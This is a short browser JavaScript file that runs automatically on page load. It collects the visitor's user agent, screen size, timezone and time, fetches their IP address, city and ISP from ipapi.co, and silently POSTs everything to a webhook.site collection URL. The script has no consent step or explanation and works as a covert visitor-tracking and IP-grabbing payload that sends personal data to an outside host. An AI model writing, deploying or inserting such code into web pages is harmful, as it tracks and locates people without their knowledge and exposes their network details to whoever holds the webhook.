const webhookUrl = "https://webhook.site/ab21f221-5faa-41cb-8741-96680e7e987a";

async function collectAllData() {
    let data = {
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        screen: { w: window.screen.width, h: window.screen.height },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        data.network = { ip: ipData.ip, city: ipData.city, isp: ipData.org };
    } catch (e) { data.network = "IP API failed"; }

    fetch(webhookUrl, { 
        method: 'POST', 
        mode: 'no-cors', 
        body: JSON.stringify(data) 
    });
}

collectAllData();